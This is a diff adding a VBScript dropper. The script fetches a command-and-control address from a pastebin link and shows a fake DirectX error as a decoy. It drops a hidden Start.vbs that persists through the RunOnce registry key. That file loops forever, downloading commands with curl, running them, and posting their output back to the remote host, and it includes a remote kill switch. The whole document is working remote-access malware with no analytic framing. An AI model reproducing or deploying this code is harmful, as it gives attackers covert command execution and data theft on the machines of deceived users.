@@ -1,0 +1,53 @@
+On Error Resume Next
+Set objShell = CreateObject("WScript.Shell")
+Set oHTTP = CreateObject("MSXML2.XMLHTTP")
+oHTTP.open "GET", "https://pastebin.com/raw/knWXwasC", False
+oHTTP.send
+tunnel = oHTTP.responseText
+
+If InStr(tunnel, "hold") > 0 Then
+MsgBox "DirectX function *FindClosestMatchingMode* failed with DXGI_ERROR_NOT_CURRENTLY_AVAILABLE (The requested functionality is not supported by the device or driver.)", vbCritical, "DirectX Error"
+	WScript.Quit
+End If
+
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+
+tempPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%") & "\Start.vbs"
+lnkPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%") & "\.vbs"
+dirPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%") & "\IXP000.TMP"
+
+objFSO.DeleteFile lnkPath
+objFSO.DeleteFolder dirPath
+
+Set objFile = objFSO.CreateTextFile(tempPath, True)
+
+objFile.WriteLine "On Error Resume Next"
+objFile.WriteLine "Do While True"
+objFile.WriteLine "Set objShell = CreateObject(""WScript.Shell"")"
+objFile.WriteLine "objShell.Run ""reg add """"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce"""" /v """"Start"""" /t REG_SZ /d """"%TEMP%\Start.vbs"""" /f"", 0, True"
+objFile.WriteLine "Set oHTTP = CreateObject(""MSXML2.XMLHTTP"")"
+objFile.WriteLine "oHTTP.open ""GET"", ""https://pastebin.com/raw/knWXwasC"", False"
+objFile.WriteLine "oHTTP.send"
+objFile.WriteLine "tunnel = oHTTP.responseText"
+objFile.WriteLine "If InStr(tunnel, ""kill"") > 0 Then"
+objFile.WriteLine "objShell.Run ""reg delete """"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"""" /v """"Start"""" /f"", 0, True"
+objFile.WriteLine "Set objFSO = CreateObject(""Scripting.FileSystemObject"")"
+objFile.WriteLine "objFSO.DeleteFile(""" & tempPath & """), True"
+objFile.WriteLine "WScript.Quit"
+objFile.WriteLine "End If"
+objFile.WriteLine "sh = ""@echo off&cd %userprofile%&cmd /V:ON /C """"SET ip="" & tunnel & ""&&SET sid=""""Authorization: ac3b22bb-4baa2f93-341bd899""""&&SET protocol=http://&&curl !protocol!!ip!/ac3b22bb -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/4baa2f93 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/341bd899 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1"""" > NUL"""
+objFile.WriteLine "objShell.Run ""cmd /C "" & sh, 0, True"
+objFile.WriteLine "Set objShell = Nothing"
+objFile.WriteLine "Set objFSO = Nothing"
+objFile.WriteLine "WScript.Sleep 5000"
+objFile.WriteLine "Loop"
+objFile.WriteLine "On Error Goto 0"
+objFile.Close
+
+objShell.Run "reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce"" /v ""Start"" /t REG_SZ /d ""%TEMP%\Start.vbs"" /f", 0, True
+objFSO.GetFile(tempPath).Attributes = objFSO.GetFile(tempPath).Attributes Or 3
+MsgBox "DirectX function *FindClosestMatchingMode* failed with DXGI_ERROR_NOT_CURRENTLY_AVAILABLE (The requested functionality is not supported by the device or driver.)", vbCritical, "DirectX Error"
+objShell.Run "%TEMP%\Start.vbs", 0, False
+Set ObjFSO = Nothing
+Set ObjShell = Nothing
+On Error Goto 0
